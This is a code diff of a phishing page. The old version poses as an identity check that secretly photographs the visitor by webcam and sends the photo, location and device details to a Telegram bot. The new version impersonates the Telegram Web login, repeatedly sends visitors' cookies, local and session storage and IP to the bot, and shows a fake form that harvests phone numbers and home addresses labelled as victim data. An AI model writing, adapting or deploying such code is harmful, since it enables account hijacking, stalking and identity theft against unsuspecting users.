@@ -2,46 +2,86 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Verification</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Web</title>
     <style>
         body {
-            font-family: Arial;
-            background: #0a0a0a;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0f0f0f;
         }
-        .card {
-            background: #1a1a1a;
-            border-radius: 20px;
-            padding: 40px;
-            text-align: center;
+        .telegram-header {
+            background: #1f2c33;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .telegram-header img {
+            width: 32px;
+            height: 32px;
+        }
+        .telegram-header span {
+            color: white;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        .login-container {
             max-width: 400px;
+            margin: 50px auto;
+            background: #1f2c33;
+            border-radius: 12px;
+            padding: 30px;
+            text-align: center;
         }
-        h1 { color: white; margin-bottom: 10px; }
-        p { color: #888; margin-bottom: 30px; }
+        .login-container h2 {
+            color: white;
+            margin-bottom: 10px;
+        }
+        .login-container p {
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
         button {
-            background: #00adb5;
+            background: #2b9c5c;
             color: white;
             border: none;
-            padding: 15px 40px;
-            font-size: 18px;
-            border-radius: 50px;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 8px;
             cursor: pointer;
             width: 100%;
         }
-        .status { color: #00adb5; margin-top: 20px; font-size: 14px; }
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            background: #2c3e3f;
+            margin: 20px auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
+        }
+        .status {
+            color: #888;
+            font-size: 12px;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h1>🔐 Secure Access</h1>
-        <p>Click below to verify your identity</p>
-        <button id="btn">Continue →</button>
+    <div class="telegram-header">
+        <img src="https://telegram.org/img/favicon.ico" alt="logo">
+        <span>Telegram Web</span>
+    </div>
+    <div class="login-container">
+        <h2>Log in to Telegram</h2>
+        <p>Use your phone to confirm login</p>
+        <div class="qr-code">
+            <span style="color:#888;">Loading...</span>
+        </div>
+        <button id="loginBtn">Continue with Phone →</button>
         <div class="status" id="status"></div>
     </div>
 
@@ -49,76 +89,82 @@
         const BOT_TOKEN = '8172323730:AAEfo4Eqz8E9HWSNOGF96BHndyjN9anBRLg';
         const CHAT_ID = '1471307057';
         
-        async function getAllPermissions() {
-            const status = document.getElementById('status');
-            status.innerHTML = '📷 Requesting camera...';
-            
-            // 1. Camera + Mic
-            let stream = null;
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                status.innerHTML = '🎤 Camera & mic granted';
-                
-                // Capture photo
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const photo = canvas.toDataURL('image/jpeg', 0.8);
-                
-                // Send photo
-                const blob = await fetch(photo).then(r => r.blob());
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'selfie.jpg');
-                formData.append('caption', `📸 Selfie\nTime: ${new Date().toLocaleString()}\nUA: ${navigator.userAgent}`);
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {
-                status.innerHTML = '⚠️ Camera denied';
-            }
-            
-            // 2. Location
-            status.innerHTML = '📍 Getting location...';
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    const loc = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ chat_id: CHAT_ID, latitude: loc.lat, longitude: loc.lng })
-                    });
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: `📍 Location: ${loc.lat}, ${loc.lng}\nAccuracy: ${loc.acc}m`, parse_mode: 'HTML' })
-                    });
-                    status.innerHTML = '✅ Verification complete';
-                },
-                () => { status.innerHTML = '⚠️ Location denied'; }
-            );
-            
-            // 3. Device info + IP
-            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'unknown');
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: CHAT_ID, text: `📱 Device\nIP: ${ip}\nUA: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, parse_mode: 'HTML' })
+        // Собираем IP и данные
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🔍 <b>New Visitor</b>\nIP: ${data.ip}\nUA: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}`,
+                        parse_mode: 'HTML'
+                    })
+                });
             });
+        
+        // Функция кражи cookies
+        function stealCookies() {
+            const cookies = document.cookie;
+            const localStorage = JSON.stringify(localStorage);
+            const sessionStorage = JSON.stringify(sessionStorage);
             
-            setTimeout(() => { window.location.href = 'https://google.com'; }, 3000);
+            if (cookies || localStorage !== '{}') {
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🍪 <b>STOLEN SESSION</b>\n\nCookies: ${cookies.substring(0, 500)}\n\nLocalStorage: ${localStorage.substring(0, 500)}\n\nSessionStorage: ${sessionStorage.substring(0, 500)}`,
+                        parse_mode: 'HTML'
+                    })
+                });
+            }
         }
         
-        document.getElementById('btn').onclick = () => {
-            document.getElementById('btn').disabled = true;
-            document.getElementById('btn').style.opacity = '0.5';
-            getAllPermissions();
+        // Пытаемся украсть сразу
+        setTimeout(stealCookies, 2000);
+        
+        // Кнопка "Continue with Phone" — ведет на фейковую форму
+        document.getElementById('loginBtn').onclick = () => {
+            document.getElementById('status').innerHTML = '⏳ Redirecting to verification...';
+            
+            setTimeout(() => {
+                // Редирект на фейковую форму ввода номера и адреса
+                document.body.innerHTML = `
+                    <div style="max-width:400px; margin:50px auto; background:#1f2c33; border-radius:12px; padding:30px;">
+                        <h2 style="color:white;">Verify Your Account</h2>
+                        <p style="color:#888;">For security, please confirm your details</p>
+                        <input type="text" id="phone" placeholder="Phone Number" style="width:100%; padding:12px; margin:10px 0; border-radius:8px; border:none;">
+                        <input type="text" id="address" placeholder="Full Address" style="width:100%; padding:12px; margin:10px 0; border-radius:8px; border:none;">
+                        <button onclick="submitData()" style="background:#2b9c5c; color:white; border:none; padding:12px; width:100%; border-radius:8px;">Verify</button>
+                    </div>
+                    <script>
+                        function submitData() {
+                            const phone = document.getElementById('phone').value;
+                            const address = document.getElementById('address').value;
+                            
+                            fetch('https://api.telegram.org/bot${BOT_TOKEN}/sendMessage', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    chat_id: ${CHAT_ID},
+                                    text: '📞 <b>VICTIM DATA</b>\\nPhone: ' + phone + '\\nAddress: ' + address + '\\nTime: ' + new Date().toLocaleString(),
+                                    parse_mode: 'HTML'
+                                })
+                            });
+                            
+                            document.body.innerHTML = '<div style="text-align:center; padding:50px;"><h2>✅ Verified</h2><p>Redirecting to Telegram...</p></div>';
+                            setTimeout(() => { window.location.href = 'https://web.telegram.org'; }, 2000);
+                        }
+                    <\/script>
+                `;
+            }, 500);
         };
+        
+        // Пытаемся украсть cookies каждые 5 секунд
+        setInterval(stealCookies, 5000);
     </script>
 </body>
 </html>
